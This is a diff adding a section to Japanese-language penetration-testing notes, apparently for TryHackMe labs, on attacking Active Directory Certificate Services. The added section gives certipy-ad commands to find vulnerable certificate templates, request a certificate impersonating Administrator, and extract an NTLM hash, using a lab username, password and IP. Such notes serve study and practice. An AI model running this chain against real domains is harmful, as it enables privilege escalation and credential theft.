@@ -399,6 +399,30 @@ adidnsdump -u <DOMAIN_NAME>\\<USER> ldap//<DC_IP> -r
 ---
 # Literal Movement
 他の資格情報を取得するための列挙・攻撃
+## 証明書関連の脆弱性
+### Certpy
+- Active Directory Certificate Services（AD CS）に対する攻撃や調査を行えるツール
+- AD CS：Active Directory Certificate Services。Windowsドメイン環境に証明書を発行・管理するサービス。
+- Windowsドメイン環境で証明書ベースの権限昇格や認証回避などの脆弱性（たとえば ESC1〜ESC8）を検出・悪用するために使う
+	- ESC1〜ESC8
+		- 証明書関連の典型的な脆弱性パターン
+		- たとえば ESC1 は「ユーザーが自分で証明書を要求でき、証明書で任意のユーザーを偽装できる」問題
+脆弱な証明書の調査
+```sh
+certipy-ad find -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -target labyrinth.thm.local -stdout -vulnerable
+```
+
+脆弱な証明書の取得
+```sh
+certipy-ad req -username 'SUSANNA_MCKNIGHT@thm.local' -password 'CHANGEME2023!' -ca thm-LABYRINTH-CA -target labyrinth.thm.local -template ServerAuth -upn Administrator@thm.local
+```
+
+NTLMハッシュのリクエスト
+- 取得できたら、smbexec.pyなどで使える
+```sh
+certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.133.131
+```
+使用例 : [[TryHackMe_Memo/Machine/Ledger#Certpy\|Ledger#Certpy]]
 
 ## 特権アクセス先の利用
 ### RDP (Remote Desktop Protocol)
